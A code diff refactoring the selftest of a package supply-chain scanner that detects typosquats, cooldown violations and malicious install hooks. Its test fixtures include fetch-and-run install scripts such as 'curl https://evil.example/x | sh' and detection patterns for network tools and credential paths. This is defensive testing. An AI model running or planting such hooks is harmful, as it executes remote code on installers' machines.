+    # 合成設定根目錄：allowlist 不依賴 repo 現有的條目與到期日（預設空，案例用 set_allow 寫入）
+    CR = Path(tempfile.mkdtemp())
+    shutil.copytree(ROOT / "config" / "slopsquat", CR / "config" / "slopsquat")
+    shutil.copy(ROOT / "vibesec.yaml", CR / "vibesec.yaml")
+
+    def set_allow(entries):
+        (CR / "config/slopsquat/allowlist.yaml").write_text(yaml.safe_dump({"version": 1, "entries": entries}), encoding="utf-8")
+    set_allow([])
+    # 合成例外（不依賴政策檔現有例外與其到期日）：暫存 root 放本 repo 政策的副本，只換掉 exceptions；
+    # G1 經 Policy(暫存 root) 讀例外，暫存 root 就是「本 repo」（例外照常套用），其他目標都是外部專案
     PR = Path(tempfile.mkdtemp())
     (PR / "config/policy").mkdir(parents=True)
     pol = yaml.safe_load((ROOT / "config/policy/blocking-policy.yaml").read_text(encoding="utf-8"))
@@ -818,16 +734,13 @@ def selftest():
     shutil.copy(ROOT / "vibesec.yaml", PR / "vibesec.yaml")
     (PR / "examples/vulnapp").mkdir(parents=True)
     shutil.copy(ROOT / "examples/vulnapp/pyproject.toml", PR / "examples/vulnapp/pyproject.toml")
-    _POLICY = Policy(PR, project_root=None)   # 明確傳值：不受 CI 設定的 VIBESEC_PROJECT_ROOT 影響
+    # 明確傳值：政策不受 CI 設定的 VIBESEC_PROJECT_ROOT 影響；git 依目標專案在 run() 建立
+    env = build_env(Policy(PR, project_root=None), git=None, registry=StubRegistry(), config_root=CR)
 
     def run(*argv):
-        global TARGET
         out, err = io.StringIO(), io.StringIO()
-        try:
-            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-                code = main(["g1_slopcheck.py", *argv])
-        finally:
-            TARGET = ROOT
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = main(["g1_slopcheck.py", *argv], env_factory=lambda root: (dataclasses.replace(env, git=SubprocessGit(root)), None))
         return code, (json.loads(out.getvalue()) if out.getvalue().strip() else {})
 
     def git(d, *a):
@@ -837,16 +750,16 @@ def selftest():
         # PEP 503：PyPI 的 _ / . / 大小寫與 - 是同一個專案；npm 不正規化；真正的拼錯仍要抓到
         c = {"similarity": 0.80}
         for name in ("typing_extensions", "Typing.Extensions", "TYPING-extensions"):
-            if similarity_check(name, "pypi", {"typing-extensions"}, {}, c):
+            if similarity_check(env, name, "pypi", {"typing-extensions"}, {}, c):
                 fails.append(f"PyPI {name} 與 typing-extensions 是同一個專案（PEP 503），不得判 typosquat")
-        if not similarity_check("typing-extensionz", "pypi", {"typing-extensions"}, {}, c):
+        if not similarity_check(env, "typing-extensionz", "pypi", {"typing-extensions"}, {}, c):
             fails.append("PyPI typing-extensionz 仍要判 typosquat")
-        if not similarity_check("left_pad", "npm", {"left-pad"}, {}, c):
+        if not similarity_check(env, "left_pad", "npm", {"left-pad"}, {}, c):
             fails.append("npm 的 left_pad 與 left-pad 是不同套件，不做 PEP 503 正規化")
         # 編輯距離：相鄰易位算 1 次；5 個字元以內只認 1 次編輯，較長的名稱認到 2 次
         for name, good, want in (("axois", "axios", True), ("numpyy", "numpy", True), ("pnadsa", "pandas", True),
                                  ("zipp", "pip", False), ("hpack", "black", False), ("pyrit", "pyjwt", False)):
-            if bool(similarity_check(name, "pypi", {good}, {}, {"similarity": 0.99})) != want:
+            if bool(similarity_check(env, name, "pypi", {good}, {}, {"similarity": 0.99})) != want:
                 fails.append(f"{name} 對 {good}：{'應' if want else '不應'}判 typosquat（距離 {_edit_distance(name, good)}）")
         # 同形字／分隔符 lookalike：編輯距離門檻（ratio 0.99、長名最多 2 次編輯）抓不到也要擋
         hc = {"similarity": 0.99}
@@ -855,22 +768,22 @@ def selftest():
                                  ("leftpad", "left-pad", True),       # npm 去分隔符後相同
                                  ("requests", "requests", False),     # 完全相同 → 不報
                                  ("flask", "django", False)):         # 不相干
-            if bool(similarity_check(name, "npm" if good == "left-pad" else "pypi", {good}, {}, hc)) != want:
+            if bool(similarity_check(env, name, "npm" if good == "left-pad" else "pypi", {good}, {}, hc)) != want:
                 fails.append(f"同形字/分隔符 {name} 對 {good}：{'應' if want else '不應'}判 typosquat")
         # 安裝 hook：prepare 也要掃；decision（block/advisory）取自設定
         _pat = {"network": [r"curl"], "exec": [r"\bsh\b"], "env_read": [r"TOKEN"], "credential_paths": [r"\.aws"], "ai_cli_abuse": []}
         _dec = {"any_network_and_exec": "block", "exec_only": "advisory"}
-        fp = install_hook_finding("p", "npm", "1.0.0", {"prepare": "curl x | sh"}, patterns=_pat, npm_scripts=["preinstall", "install", "postinstall", "prepare"], decision=_dec)
+        fp = install_hook_finding(env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"}, patterns=_pat, npm_scripts=["preinstall", "install", "postinstall", "prepare"], decision=_dec)
         if not fp or fp["policy_tier"] != "blocking":
             fails.append("安裝 hook：prepare 腳本外連＋執行 → blocking（需掃 prepare 並讀 decision）")
-        fa = install_hook_finding("p", "npm", "1.0.0", {"postinstall": "node build.js | sh"}, patterns=_pat, npm_scripts=["postinstall"], decision=_dec)
+        fa = install_hook_finding(env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"}, patterns=_pat, npm_scripts=["postinstall"], decision=_dec)
         if not fa or fa["policy_tier"] != "advisory":
             fails.append("安裝 hook：只有執行、無外連/憑證 → advisory（exec_only）")
         # decision 可調政策：把 exec_only 設 block → 同一輸入升為 blocking（證明設定真的生效、非寫死）
-        fb = install_hook_finding("p", "npm", "1.0.0", {"postinstall": "node build.js | sh"}, patterns=_pat, npm_scripts=["postinstall"], decision={"exec_only": "block"})
+        fb = install_hook_finding(env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"}, patterns=_pat, npm_scripts=["postinstall"], decision={"exec_only": "block"})
         if not fb or fb["policy_tier"] != "blocking":
             fails.append("安裝 hook：decision 由設定驅動（exec_only=block 應使同一輸入變 blocking）")
-        if install_hook_finding("p", "npm", "1.0.0", {"prepare": "curl x | sh"}, patterns=_pat, npm_scripts=["preinstall", "install", "postinstall"], decision=_dec) is not None:
+        if install_hook_finding(env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"}, patterns=_pat, npm_scripts=["preinstall", "install", "postinstall"], decision=_dec) is not None:
             fails.append("安裝 hook：npm_scripts 不含 prepare 時不掃 prepare（名單由設定決定）")
         bl = {("pypi", "foo-bar"): {"reason": "t"}, (None, "baz_qux"): {"reason": "u"}}
         if not lookup(bl, "pypi", "Foo_Bar") or not lookup(bl, "pypi", "baz.qux") or lookup(bl, "npm", "baz-qux"):
@@ -890,14 +803,14 @@ def selftest():
             ]
             import yaml as _yaml
             al.write_text(_yaml.safe_dump({"version": 1, "entries": entries}), encoding="utf-8")
-            valid, ignored = real_allowlist(al, today=date(2026, 10, 6))
+            valid, ignored = load_allowlist(dataclasses.replace(env, today=date(2026, 10, 6)), al)
             if sorted(e["package"] for e in valid) != ["Typing_Ext", "ok-range"] or len(ignored) != 5:
                 fails.append(f"allowlist 載入：讀 entries、缺欄位／過期／bypass 不可放行／version 無法解析／日期無效 → 忽略並回報"
                              f"（有效 {[e['package'] for e in valid]}，忽略 {ignored}）")
             if not any("install_hook" in x for x in ignored) or not any("過期" in x for x in ignored):
                 fails.append(f"allowlist 被忽略的理由要寫明（得到 {ignored}）")
             al.write_text(_yaml.safe_dump({"packages": [entries[0]]}), encoding="utf-8")
-            if [e["package"] for e in real_allowlist(al, today=date(2026, 10, 6))[0]] != ["ok-range"]:
+            if [e["package"] for e in load_allowlist(dataclasses.replace(env, today=date(2026, 10, 6)), al)[0]] != ["ok-range"]:
                 fails.append("allowlist 舊格式（packages:）也要讀")
         spec = parse_version_spec
         for sp, ver, want in [(None, None, True), ("2.32.5", "2.32.5", True), ("==2.32.5", "2.32.6", False),
@@ -909,17 +822,17 @@ def selftest():
                  "approved_by": "a@x", "expires": "2026-12-31", "ticket": "SEC-1", "reason": "r"},
                 {"package": "Typing_Ext", "ecosystem": "pypi", "spec": spec("1.0.0"), "bypass": {"similarity"},
                  "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"}]
-        f = apply_allowlist(fnd("vibesec.g1.cooldown-violation", "ok-range", "npm", "2.1.0", "t", "blocking"), ents)
+        f = apply_allowlist(fnd(env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "2.1.0", "t", "blocking"), ents)
         if f["policy_tier"] != "advisory" or (f.get("allowlist") or {}).get("ticket") != "SEC-1":
             fails.append("allowlist：bypass 含 cooldown、版本在範圍內 → cooldown 發現降為 advisory 並附核准資訊")
-        for f, why in [(fnd("vibesec.g1.cooldown-violation", "ok-range", "npm", "3.0.0", "t", "blocking"), "版本不在範圍"),
-                       (fnd("vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"), "安裝 hook 永不放行"),
-                       (fnd("vibesec.g1.hallucinated-package", "ok-range", "npm", "2.1.0", "t", "blocking", "registry_health"),
+        for f, why in [(fnd(env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "3.0.0", "t", "blocking"), "版本不在範圍"),
+                       (fnd(env, "vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"), "安裝 hook 永不放行"),
+                       (fnd(env, "vibesec.g1.hallucinated-package", "ok-range", "npm", "2.1.0", "t", "blocking", "registry_health"),
                         "bypass 沒列 registry_health"),
-                       (fnd("vibesec.g1.cooldown-violation", "ok-range", "pypi", "2.1.0", "t", "blocking"), "生態系不同")]:
+                       (fnd(env, "vibesec.g1.cooldown-violation", "ok-range", "pypi", "2.1.0", "t", "blocking"), "生態系不同")]:
             if apply_allowlist(f, ents)["policy_tier"] != "blocking" or f.get("allowlist"):
                 fails.append(f"allowlist 不得放行：{why}")
-        f = apply_allowlist(fnd("vibesec.g1.hallucinated-package", "typing-ext", "pypi", None, "t", "blocking", "similarity"), ents, "1.0.0")
+        f = apply_allowlist(fnd(env, "vibesec.g1.hallucinated-package", "typing-ext", "pypi", None, "t", "blocking", "similarity"), ents, "1.0.0")
         if f["policy_tier"] != "advisory":
             fails.append("allowlist：名稱依 PEP 503 比對；發現沒有版本時以套件版本比對 version")
         with tempfile.TemporaryDirectory() as d:
@@ -929,7 +842,7 @@ def selftest():
                           "npm install --registry https://r.example.com bar\npip install -U fastapi-auth-helperz\n"
                           "npm install -D left-pad\nRun `pip install requests`, then `pip install requests` again.\n",
                           encoding="utf-8")
-            got = rule_file_mentions(rf)
+            got = rule_file_mentions(env, rf)
             want = [("npm", "left-pad", None), ("pypi", "fastapi-auth-helperz", None), ("pypi", "requests", None)]
             if sorted(got) != want:
                 fails.append(f"規則檔：帶值旗標（-r、-e、--index-url、--registry）的值不是套件名，重複提及只算一次（得到 {got}）")
@@ -994,17 +907,12 @@ def selftest():
             # 並行查詢中單一套件的檢查丟出意外的錯誤：只影響這一個套件（記未完成），其他套件照常判定，整批不中斷（#264）
             (D / "boom").mkdir()
             (D / "boom/package.json").write_text(json.dumps({"dependencies": {"fine-pkg": "1.0.0", "boom-pkg": "1.0.0", "other-pkg": "2.0.0"}}))
-            def maybe_boom(pkg, ver, c):
-                if pkg == "boom-pkg":
-                    calls.append((pkg, ver))
-                    raise RuntimeError("selftest 意外")
-                return stub(pkg, ver, c)          # stub 自己會記錄查詢
-            npm_check = maybe_boom
+            boom.add("boom-pkg")
             try:
                 calls.clear()
                 code, out = run("--target", str(D), "--manifest", "boom/package.json")
             finally:
-                npm_check = stub
+                boom.clear()
             if sorted(calls) != [("boom-pkg", "1.0.0"), ("fine-pkg", "1.0.0"), ("other-pkg", "2.0.0")]:
                 fails.append(f"單一套件的檢查丟出意外錯誤時，其他套件仍要查（查詢 {sorted(calls)}）")
             if {f["package"] for f in out.get("findings", [])} != {"fine-pkg", "other-pkg"}:
@@ -1013,11 +921,11 @@ def selftest():
                 fails.append(f"失敗的那一個套件要記成未完成原因，不是崩潰也不是通過（得到 {out.get('incomplete_checks')}）")
             if code not in (1, 2):
                 fails.append(f"單一套件失敗時整批仍要正常結束（exit 1 或 2，不是崩潰；得到 {code}）")
-            allow[:] = [{"package": "fastapi", "ecosystem": "pypi", "spec": parse_version_spec("0.1.0"), "bypass": {"cooldown"},
-                         "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"}]
+            set_allow([{"package": "fastapi", "ecosystem": "pypi", "version": "0.1.0", "bypass": ["cooldown"],
+                         "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"}])
             calls.clear()
             code, out = run("--target", str(D), "--manifest", "deploy/python-requirements.txt")
-            allow.clear()
+            set_allow([])
             fa = [f for f in out.get("findings", []) if f["package"] == "fastapi"]
             # 只剩 advisory，但 PyPI 安裝腳本未檢查（VS-G1-INSTALL-HOOK untested）→ incomplete、exit 2，不得記 pass
             if calls != [("fastapi", "0.1.0")] or [f["policy_tier"] for f in fa] != ["advisory"] or code != 2:
@@ -1025,11 +933,11 @@ def selftest():
             elif out.get("status") != "incomplete" or "VS-G1-INSTALL-HOOK" not in (out.get("status_reason") or ""):
                 fails.append(f"PyPI 安裝腳本未檢查 → stdout 應為 incomplete 並列出 VS-G1-INSTALL-HOOK（得到 {out.get('status')}：{out.get('status_reason')}）")
             # 同一情境寫出的 gate JSON：VS-G1-INSTALL-HOOK untested → 整體 incomplete（以前記 pass），且符合 schema
-            allow[:] = [{"package": "fastapi", "ecosystem": "pypi", "spec": parse_version_spec("0.1.0"), "bypass": {"cooldown"},
-                         "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"}]
+            set_allow([{"package": "fastapi", "ecosystem": "pypi", "version": "0.1.0", "bypass": ["cooldown"],
+                         "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"}])
             gate = D.parent / f"{D.name}-hook-gate.json"
             code, _ = run("--target", str(D), "--manifest", "deploy/python-requirements.txt", "--gate", str(gate))
-            allow.clear()
+            set_allow([])
             g = json.loads(gate.read_text(encoding="utf-8"))
             gate.unlink()
             hook = next((c for c in g.get("coverage", []) if c["control_id"] == "VS-G1-INSTALL-HOOK"), {})
@@ -1076,10 +984,10 @@ def selftest():
         W = Path(tempfile.mkdtemp())
         (W / "examples/vulnapp").mkdir(parents=True)
         shutil.copy(ROOT / "examples/vulnapp/pyproject.toml", W / "examples/vulnapp/pyproject.toml")
-        policy_saved = _POLICY
+        env_saved = env
         try:
             for proj, label in ((W, "project_root＝受驗樹"), (None, "沒有 project_root")):
-                _POLICY = Policy(PR, project_root=proj)
+                env = dataclasses.replace(env_saved, policy=Policy(PR, project_root=proj))
                 gate = W / "gate.json"
                 code, out = run("--target", str(W), "--manifest", "examples/vulnapp/pyproject.toml", "--gate", str(gate))
                 why = json.loads(gate.read_text(encoding="utf-8")).get("status_reason") or ""
@@ -1091,7 +999,7 @@ def selftest():
                 elif any(f.get("exception") for f in out.get("findings") or []) or "未套用" not in why:
                     fails.append(f"CI 形狀，{label} → 外部專案，例外未套用（{why}）")
         finally:
-            _POLICY = policy_saved
+            env = env_saved
             shutil.rmtree(W, ignore_errors=True)
         code, _ = run("--target", str(ROOT / "no-such-dir"))
         if code != 2:
@@ -1133,8 +1041,6 @@ def selftest():
         # 設定檔缺席或壞掉 → 門檻退回內建值、安裝腳本樣式／黑名單／熱門清單變空，檢查變寬鬆卻照樣記 pass（fail-open）。
         # 會讓檢查變寬鬆的設定必須讀得到，否則 incomplete 並列出檔名（AGENTS.md #2）；allowlist／例外壞掉只會更嚴，不在此列。
         import shutil
-        real_cfg_dir, real_vibesec = CFG_DIR, ROOT / "vibesec.yaml"
-        npm_check = lambda pkg, ver, c: ([], None)
         with tempfile.TemporaryDirectory() as d:
             D, C = Path(d) / "proj", Path(d) / "cfg"
             D.mkdir()
@@ -1155,19 +1061,21 @@ def selftest():
             ]
             for label, broken, content in cases:
                 shutil.rmtree(C, ignore_errors=True)
-                shutil.copytree(real_cfg_dir, C)
-                shutil.copy(real_vibesec, C / "vibesec.yaml")
+                shutil.copytree(ROOT / "config" / "slopsquat", C / "config" / "slopsquat")
+                shutil.copy(ROOT / "vibesec.yaml", C / "vibesec.yaml")
                 if broken:
-                    (C / broken).unlink()
+                    broken_path = C / "vibesec.yaml" if broken == "vibesec.yaml" else C / "config" / "slopsquat" / broken
+                    broken_path.unlink()
                     if content is not None:
-                        (C / broken).write_text(content)
-                CFG_DIR, VIBESEC_FILE, _RULE_CFG = C, C / "vibesec.yaml", None
+                        broken_path.write_text(content)
+                env_saved = env
+                env = build_env(env_saved.policy, git=None, registry=CleanRegistry(), config_root=C)
                 try:
                     code, out = run("--target", str(D))
                 except Exception as e:      # 設定型別不對時直接崩潰：exit 1 在 G1 代表 blocking，不是 incomplete
                     code, out = f"例外 {type(e).__name__}", {}
                 finally:
-                    CFG_DIR, VIBESEC_FILE, _RULE_CFG = real_cfg_dir, real_vibesec, None
+                    env = env_saved
                 if broken is None:
                     if code != 0 or out.get("status"):
                         fails.append(f"設定檔：{label} → pass（exit {code}，{out.get('status')}：{out.get('status_reason')}）")
@@ -1176,8 +1084,6 @@ def selftest():
                     fails.append(f"設定檔：{label} → incomplete 並在 incomplete_checks 列出 {broken}"
                                  f"（exit {code}，{out.get('status')}，{out.get('incomplete_checks')}）")
     finally:
-        npm_check, pypi_check, pypi_requires, load_allowlist, _POLICY = real
-        TARGET = ROOT
         shutil.rmtree(PR, ignore_errors=True)
     # 專案自身的安裝腳本與規則檔多套件 install（清單解析器的案例已搬到 tests/test_g1_manifests.py，#262）
     with tempfile.TemporaryDirectory() as d:
@@ -1185,41 +1091,37 @@ def selftest():
         (D / "package.json").write_text(json.dumps({"dependencies": {"lodash": "npm:evil-pkg@1.0.0", "react": "github:a/react", "express": "latest", "left-pad": "^1.3.0"},
                                                      "optionalDependencies": {"axois": "1.0.0"}, "peerDependencies": {"peer-x": "~2.0.0"},
                                                      "scripts": {"postinstall": "curl https://evil.example/x | sh"}}))
-        if not self_install_hooks(D / "package.json"):
+        if not self_install_hooks(env, D / "package.json"):
             fails.append("本專案 package.json 的 postinstall 外連應被查出")
         (D / "AGENTS.md").write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n")
-        ment = {(e, n) for e, n, _ in rule_file_mentions(D / "AGENTS.md")}
+        ment = {(e, n) for e, n, _ in rule_file_mentions(env, D / "AGENTS.md")}
         if ment != {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")}:
             fails.append(f"規則檔同一行多個套件都要查（得到 {sorted(ment)}）")
         # 規則檔：讀設定的 glob（含 .cursor/rules/**/*.mdc）；uv add／poetry add／bun add 也是安裝指令
         for p, want in ((".cursor/rules/a.mdc", True), (".cursor/rules/x/y.mdc", True), ("CLAUDE.md", True),
                         ("sub/AGENTS.md", True), ("docs/x.md", True), ("notes.mdc", False), ("app/main.py", False)):
-            if is_rule_file(p) != want:
+            if is_rule_file(env, ROOT, p) != want:
                 fails.append(f"is_rule_file({p!r}) 應為 {want}（依 scan_agent_rule_files／agent_rule_files）")
         (D / "AGENTS.md").write_text("uv add --dev fastapi-auth-helperz\n`poetry add reqursts`\nbun add axois\n"
                                      "python -m pip install numpyy\n")
-        ment = {(e, n) for e, n, _ in rule_file_mentions(D / "AGENTS.md")}
+        ment = {(e, n) for e, n, _ in rule_file_mentions(env, D / "AGENTS.md")}
         if ment != {("pypi", "fastapi-auth-helperz"), ("pypi", "reqursts"), ("npm", "axois"), ("pypi", "numpyy")}:
             fails.append(f"規則檔：uv add／poetry add／bun add／python -m pip 也要查（得到 {sorted(ment)}）")
-        saved_rc = _RULE_CFG
-        _RULE_CFG = (["*.rules"], re.compile(r"\bmytool\s+fetch\s+(?P<pypi>[^\n#]+)"))
-        try:
-            (D / "x.rules").write_text("mytool fetch --quiet evilpkg-x\n")
-            if not is_rule_file("x.rules") or rule_file_mentions(D / "x.rules") != [("pypi", "evilpkg-x", None)]:
-                fails.append("規則檔 glob 與 install_command_regex 要讀設定，不是寫死")
-        finally:
-            _RULE_CFG = saved_rc
+        env_rc = dataclasses.replace(env, rule_cfg=(["*.rules"], re.compile(r"\bmytool\s+fetch\s+(?P<pypi>[^\n#]+)")))
+        (D / "x.rules").write_text("mytool fetch --quiet evilpkg-x\n")
+        if not is_rule_file(env_rc, D, "x.rules") or rule_file_mentions(env_rc, D / "x.rules") != [("pypi", "evilpkg-x", None)]:
+            fails.append("規則檔 glob 與 install_command_regex 要讀設定，不是寫死")
     # 本 repo 的 G1 文件本身也是被掃描的 markdown：範例若寫成可執行的安裝指令，就會被當成真的去查 registry。
     # 以前 docs/02 寫了 `pip install foo`，而 PyPI 上真的有 foo（唯一的版本 .1 沒有任何發布檔、沒有上傳時間）→
     # 冷卻期查不到 → 任何改到 docs/02 的 PR 都讓 G1 incomplete（enforce 下 exit 2 擋下）。
     # docs/03 的事故 SOP 寫了 `pip install git-filter-repo`：PyPI 套件的安裝腳本尚無檢查 → VS-G1-INSTALL-HOOK 未實測 → 同樣 incomplete
     for doc in ("docs/02-g1-supply-chain.md", "docs/03-g2-secrets.md"):
-        doc_mentions = rule_file_mentions(ROOT / doc)
+        doc_mentions = rule_file_mentions(env, ROOT / doc)
         if doc_mentions:
             fails.append(f"{doc} 的範例不得寫成可執行的安裝指令（會被 G1 規則檔掃描當真去查 registry）：{doc_mentions}")
     # cfg()：讀 cooldown.yaml 真正的鍵（similarity.difflib_ratio_min 等），不是不存在的頂層 similarity_ratio
-    cy = load_yaml(CFG_DIR / "cooldown.yaml") or {}
-    c = cfg()
+    cy = load_yaml(env.config_dir / "cooldown.yaml") or {}
+    c = cfg(env)
     if (c["similarity"], c["levenshtein_max"], c["min_name_length"]) != tuple(
             (cy.get("similarity") or {}).get(k) for k in ("difflib_ratio_min", "levenshtein_max", "min_name_length")):
         fails.append(f"cfg() 應讀 cooldown.yaml similarity.*（得到 {c}）")
@@ -1243,121 +1145,115 @@ def selftest():
     # 政策檔讀不到 → 進入點就停：G1 gate incomplete 並寫明未完成原因、沒有任何發現、退出碼 2（不查 registry）。
     # 以前 _policy() 在掃描途中拋出例外、整支結束，gate JSON 沒有寫出
     from vibesec_policy import POLICY_UNREADABLE, broken_policy_root
-    saved = _POLICY
-    try:
-        _POLICY = None
-        with broken_policy_root() as pr, tempfile.TemporaryDirectory() as d, \
-                contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
-            gp, sp = Path(d, "G1.json"), Path(d, "G1.sarif")
-            sp.write_text('{"stale": true}', encoding="utf-8")   # 上一次留下的 SARIF：讀不到政策時要刪掉（#181）
-            code = main(["g1_slopcheck.py", "--manifest", str(ROOT / "requirements-ci.in"), "--gate", str(gp),
-                         "--sarif", str(sp)], policy_root=pr)
+    with broken_policy_root() as pr, tempfile.TemporaryDirectory() as d, \
+            contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
+        gp, sp = Path(d, "G1.json"), Path(d, "G1.sarif")
+        sp.write_text('{"stale": true}', encoding="utf-8")   # 上一次留下的 SARIF：讀不到政策時要刪掉（#181）
+        code = main(["g1_slopcheck.py", "--manifest", str(ROOT / "requirements-ci.in"), "--gate", str(gp),
+                     "--sarif", str(sp)], policy_root=pr)
+        g = json.loads(gp.read_text(encoding="utf-8")) if gp.is_file() else {}
+        stale = sp.exists()
+    cov = [(c["control_id"], c["state"], (c["reason"] or "").startswith(POLICY_UNREADABLE)) for c in g.get("coverage") or []]
+    iso = re.compile(r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\+00:00$")
+    if code != 2 or g.get("status") != "incomplete" or POLICY_UNREADABLE not in (g.get("status_reason") or "") \
+            or g.get("findings_count") != {"blocking": 0, "advisory": 0} \
+            or g.get("tools") != [gate_result.tool(TOOL_NAME, "error", version=TOOL_VERSION)] \
+            or cov != [("VS-G1-SLOPSQUAT", "untested", True), ("VS-G1-COOLDOWN", "untested", True),
+                       ("VS-G1-INSTALL-HOOK", "untested", True), ("VS-G1-SBOM", "pending", False), ("ASVS5-V15.2", "pending", False)] \
+            or stale or list(schema.iter_errors(g)) \
+            or not (iso.match(g.get("started_at") or "") and iso.match(g.get("finished_at") or "")):
+        fails.append(f"政策檔讀不到 → 退出碼 2、G1 incomplete 並寫明原因、沒有發現、tool 只有一列 error、三個控制 untested"
+                     f"（原因＝政策讀不到）、SBOM／KEV pending、舊 SARIF 刪掉、時間戳 +00:00（得到 {code}、舊 SARIF 存在={stale}、{g}）")
+    # risk_tier 打錯 → load_policy 回報政策讀不到 → 照樣寫出 incomplete 閘門結果、省略 risk_tier 欄位，不拋例外（#181 決定）
+    from vibesec_policy import temp_policy_root
+    with temp_policy_root() as pr, tempfile.TemporaryDirectory() as d, \
+            contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
+        vbp = pr / "vibesec.yaml"
+        # 不依賴 vibesec.yaml 現在的值：把最上層的 risk_tier 覆寫成打錯的 l3，並確認真的換到了
+        text, n = re.subn(r"(?m)^risk_tier:.*$", "risk_tier: l3", vbp.read_text(encoding="utf-8"), count=1)
+        if n != 1:
+            fails.append("selftest 前置：vibesec.yaml 找不到最上層的 risk_tier，無法製造打錯的情境")
+        vbp.write_text(text, encoding="utf-8")
+        gp = Path(d, "G1.json")
+        try:
+            code = main(["g1_slopcheck.py", "--manifest", str(ROOT / "requirements-ci.in"), "--gate", str(gp)], policy_root=pr)
             g = json.loads(gp.read_text(encoding="utf-8")) if gp.is_file() else {}
-            stale = sp.exists()
-        cov = [(c["control_id"], c["state"], (c["reason"] or "").startswith(POLICY_UNREADABLE)) for c in g.get("coverage") or []]
-        iso = re.compile(r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\+00:00$")
-        if code != 2 or g.get("status") != "incomplete" or POLICY_UNREADABLE not in (g.get("status_reason") or "") \
-                or g.get("findings_count") != {"blocking": 0, "advisory": 0} \
-                or g.get("tools") != [gate_result.tool(TOOL_NAME, "error", version=TOOL_VERSION)] \
-                or cov != [("VS-G1-SLOPSQUAT", "untested", True), ("VS-G1-COOLDOWN", "untested", True),
-                           ("VS-G1-INSTALL-HOOK", "untested", True), ("VS-G1-SBOM", "pending", False), ("ASVS5-V15.2", "pending", False)] \
-                or stale or list(schema.iter_errors(g)) \
-                or not (iso.match(g.get("started_at") or "") and iso.match(g.get("finished_at") or "")):
-            fails.append(f"政策檔讀不到 → 退出碼 2、G1 incomplete 並寫明原因、沒有發現、tool 只有一列 error、三個控制 untested"
-                         f"（原因＝政策讀不到）、SBOM／KEV pending、舊 SARIF 刪掉、時間戳 +00:00（得到 {code}、舊 SARIF 存在={stale}、{g}）")
-        # risk_tier 打錯 → load_policy 回報政策讀不到 → 照樣寫出 incomplete 閘門結果、省略 risk_tier 欄位，不拋例外（#181 決定）
-        from vibesec_policy import temp_policy_root
-        saved_vb = VIBESEC_FILE
-        _POLICY = None
-        with temp_policy_root() as pr, tempfile.TemporaryDirectory() as d, \
-                contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
-            vbp = pr / "vibesec.yaml"
-            # 不依賴 vibesec.yaml 現在的值：把最上層的 risk_tier 覆寫成打錯的 l3，並確認真的換到了
-            text, n = re.subn(r"(?m)^risk_tier:.*$", "risk_tier: l3", vbp.read_text(encoding="utf-8"), count=1)
-            if n != 1:
-                fails.append("selftest 前置：vibesec.yaml 找不到最上層的 risk_tier，無法製造打錯的情境")
-            vbp.write_text(text, encoding="utf-8")
-            VIBESEC_FILE = vbp
-            gp = Path(d, "G1.json")
-            try:
-                code = main(["g1_slopcheck.py", "--manifest", str(ROOT / "requirements-ci.in"), "--gate", str(gp)], policy_root=pr)
-                g = json.loads(gp.read_text(encoding="utf-8")) if gp.is_file() else {}
-                if code != 2 or g.get("status") != "incomplete" or "risk_tier" in g:
-                    fails.append(f"risk_tier 打錯 → 退出碼 2、incomplete、沒有 risk_tier 欄位（得到 {code}、{g.get('status')}、{g.get('risk_tier')!r}）")
-            except Exception as e:
-                fails.append(f"risk_tier 打錯 → 不得拋例外（得到 {type(e).__name__}：{e}）")
-            finally:
-                VIBESEC_FILE = saved_vb
-    finally:
-        _POLICY = saved
+            if code != 2 or g.get("status") != "incomplete" or "risk_tier" in g:
+                fails.append(f"risk_tier 打錯 → 退出碼 2、incomplete、沒有 risk_tier 欄位（得到 {code}、{g.get('status')}、{g.get('risk_tier')!r}）")
+        except Exception as e:
+            fails.append(f"risk_tier 打錯 → 不得拋例外（得到 {type(e).__name__}：{e}）")
 
     # mode 缺席或不合法（#190、#200）：受信任政策（policy_root）的 vibesec.yaml 缺 mode 或不合法 → load_policy 回報政策讀不到 →
     # 照樣寫出 incomplete 閘門結果：mode 記 enforce、三個控制 untested、SBOM／KEV pending、tool 列只有一列 error、
     # 不查 registry、舊 SARIF 刪掉、退出碼 2。以前缺席時默默記成 shadow、照常判定，不合法時以 traceback 結束。
     # vibesec.yaml 整個讀不到（缺席、語法錯誤、不是 mapping）同樣是政策讀不到。合法的 mode 照常執行，閘門結果的 mode 取自政策
     from vibesec_policy import POLICY_UNREADABLE, set_mode_line, temp_policy_root
-    real_checks, queried = (npm_check, pypi_check, pypi_requires, _POLICY), []
-    def no_query(pkg, ver, c):
-        queried.append(pkg)
-        return [], None
-    npm_check = pypi_check = no_query
-    pypi_requires = lambda pkg, ver: set()
-    try:
-        with tempfile.TemporaryDirectory() as d, temp_policy_root() as pr:
-            D = Path(d) / "proj"
-            D.mkdir()
-            (D / "package.json").write_text(json.dumps({"dependencies": {"express": "4.21.2"}}))
-            git(D, "init", "-q"); git(D, "add", "package.json"); git(D, "commit", "-qm", "t")
-            vbp = pr / "vibesec.yaml"
